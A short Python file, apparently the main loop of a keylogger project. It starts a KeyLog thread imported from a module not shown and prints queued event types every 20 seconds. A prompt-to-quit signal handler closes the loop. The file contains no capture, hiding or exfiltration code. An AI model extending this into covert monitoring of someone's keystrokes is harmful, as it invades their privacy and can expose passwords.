# Main event loop
import threading, signal, sys, time
from queue import Queue
from logger import getActiveWindow, KeyLog

#Event queue
eventQueue = Queue()

#Thread locks
keyLock     = threading.Lock()
mouseLock   = threading.Lock()
procLock    = threading.Lock()

#Loggers
keyLogger   = KeyLog(eventQueue, keyLock)
keyLogger.start()

def main():
    while True:
        #empty and process the event queue
        with keyLock, mouseLock, procLock:
            while eventQueue.empty() == False:
                #process each event
                evt = eventQueue.get()
                print(evt.type)

        #wait other 20 seconds until processing the next event stack
        time.sleep(20)

def exit_gracefully(signum, frame):\
    #Original SIGINT handler
    signal.signal(signal.SIGINT, original_sigint)
    try:
        if input("\nDo you really want to quit? (y/n)> ").lower().startswith('y'):
            sys.exit(1)
    except KeyboardInterrupt:
        print("Ok ok, quitting")
        sys.exit(1)

    #Restore the exit gracefully handler here    
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    #Store the original SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
    main()

    keyLogger.join()

